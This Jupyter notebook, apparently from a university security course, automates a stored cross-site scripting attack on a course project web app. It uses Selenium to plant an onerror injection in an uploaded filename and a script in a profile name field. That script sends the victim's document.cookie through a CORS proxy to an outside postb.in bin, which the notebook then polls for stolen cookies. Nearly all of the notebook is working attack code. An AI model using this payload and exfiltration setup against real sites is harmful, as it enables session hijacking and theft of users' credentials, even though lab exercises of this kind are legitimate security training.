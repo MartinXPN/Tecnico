{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### XSS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import time \n",
    "import json\n",
    "import binascii\n",
    "import requests\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver.chrome.options import Options\n",
    "from selenium.common.exceptions import TimeoutException"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "https://postb.in/b/1603659138297-7244588069152\n"
     ]
    }
   ],
   "source": [
    "# Create postb.in bin\n",
    "r = requests.post('https://postb.in/api/bin')\n",
    "bin_id = r.json()['binId']\n",
    "print(f'https://postb.in/b/{bin_id}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [],
   "source": [
    "BASE_URL = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'\n",
    "TARGET_URL = f'https://postb.in/{bin_id}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Login victim and hacker\n",
    "victim = {\n",
    "    'username': 'victim16',\n",
    "    'password': 'victim',\n",
    "}\n",
    "hacker = {\n",
    "    'username': 'hacker16',\n",
    "    'password': 'hacker',\n",
    "}\n",
    "\n",
    "vs = requests.Session()\n",
    "r = vs.post(url=BASE_URL + '/register', data=victim)\n",
    "r = vs.post(url=BASE_URL + '/login', data=victim)\n",
    "\n",
    "hs = requests.Session()\n",
    "r = hs.post(url=BASE_URL + '/register', data=hacker)\n",
    "r = hs.post(url=BASE_URL + '/login', data=hacker)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [],
   "source": [
    "# hacker makes a friend request to the victim\n",
    "r = hs.post(url=BASE_URL + '/request_friend', data={'username': victim['username']})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "def start_driver():\n",
    "    chrome_options = Options()\n",
    "    chrome_options.add_argument(\"--headless\")\n",
    "    chrome_options.add_argument(\"--no-sandbox\")\n",
    "    driver = webdriver.Chrome(options=chrome_options)\n",
    "    driver.set_page_load_timeout(5)\n",
    "    driver.set_script_timeout(5)\n",
    "\n",
    "    return driver"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Hacker uploads a profile picture\n",
    "steal_cookies = ' onerror=\"alert(1)\"'\n",
    "\n",
    "with open(steal_cookies, 'w') as f:\n",
    "    f.write('Evil profile picture')\n",
    "\n",
    "driver = start_driver()\n",
    "driver.get(BASE_URL + '/login')\n",
    "driver.find_element_by_id('username').send_keys(hacker['username'])\n",
    "driver.find_element_by_id('password').send_keys(hacker['password'])\n",
    "\n",
    "driver.find_element_by_class_name('btn-success').click()\n",
    "driver.add_cookie({'name': '_ga', 'value': 'GA1.2.663725531.1598468128'})\n",
    "driver.add_cookie({'name': 'mySecretCookie', 'value': 'Tasty'})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.get(BASE_URL + '/profile')\n",
    "\n",
    "driver.find_element_by_id('photoInput').send_keys(os.path.abspath(steal_cookies))\n",
    "driver.find_element_by_id('currentpasswordInput').send_keys(hacker['password'])\n",
    "driver.find_element_by_class_name('btn-primary').click()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'username': 'victim15', 'password': 'victim'}"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "victim"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Hacker creates a post that steals data from the victims\n",
    "\n",
    "# var xhr = new XMLHttpRequest();\n",
    "# xhr.open(\"POST\", \"https://postb.in/1603555839181-2461015884764\", true);\n",
    "# xhr.setRequestHeader(\"Content-Type\", \"application/json\");\n",
    "# xhr.setRequestHeader(\"X-Requested-With\", \"XMLHttpRequest\");\n",
    "# xhr.send(JSON.stringify({\n",
    "#     \"cookie\": document.cookie\n",
    "# }));\n",
    "\n",
    "steal_cookies = f'''\n",
    "<script>\n",
    "    var xhr = new XMLHttpRequest();\n",
    "    xhr.open(\"POST\", \"https://cors-anywhere.herokuapp.com/{TARGET_URL}\", true);\n",
    "    xhr.setRequestHeader(\"Content-Type\", \"application/json\");\n",
    "    xhr.setRequestHeader(\"X-Requested-With\", \"XMLHttpRequest\");\n",
    "    xhr.send(JSON.stringify({{\n",
    "        \"cookie\": document.cookie\n",
    "    }}));\n",
    "    //alert(\"You are under attack!\");\n",
    "</script>'''\n",
    "\n",
    "driver = start_driver()\n",
    "# Hacker login\n",
    "driver.get(BASE_URL + '/login')\n",
    "driver.find_element_by_id('username').send_keys(hacker['username'])\n",
    "driver.find_element_by_id('password').send_keys(hacker['password'])\n",
    "driver.find_element_by_class_name('btn-success').click()\n",
    "\n",
    "# Update hacker profile with malicious content\n",
    "driver.get(BASE_URL + '/profile')\n",
    "driver.find_element_by_id('nameInput').send_keys(steal_cookies.replace('\\n', '  '))\n",
    "driver.find_element_by_id('currentpasswordInput').send_keys(hacker['password'])\n",
    "driver.find_element_by_class_name('btn-primary').click()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "# The victim opens the pending requests page and the malicious script gets executed\n",
    "# Login\n",
    "driver = start_driver()\n",
    "driver.get(BASE_URL + '/login')\n",
    "driver.find_element_by_id('username').send_keys(victim['username'])\n",
    "driver.find_element_by_id('password').send_keys(victim['password'])\n",
    "\n",
    "driver.find_element_by_class_name('btn-success').click()\n",
    "driver.add_cookie({'name': '_ga', 'value': 'GA1.2.663725531.1598468128'})\n",
    "driver.add_cookie({'name': 'mySecretCookie', 'value': 'Tasty'})\n",
    "\n",
    "# Open /pending_requests\n",
    "driver.get(BASE_URL + '/pending_requests')\n",
    "time.sleep(20)\n",
    "driver.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Postb.in create bin and track contents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "from pprint import pprint\n",
    "\n",
    "x = requests.get(f'https://postb.in/api/bin/{bin_id}/req/shift')\n",
    "if x.ok:\n",
    "    pprint(x.json()['body'])\n",
    "x = requests.get(f'https://postb.in/api/bin/{bin_id}/req/shift')\n",
    "if x.ok:\n",
    "    pprint(x.json()['body'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
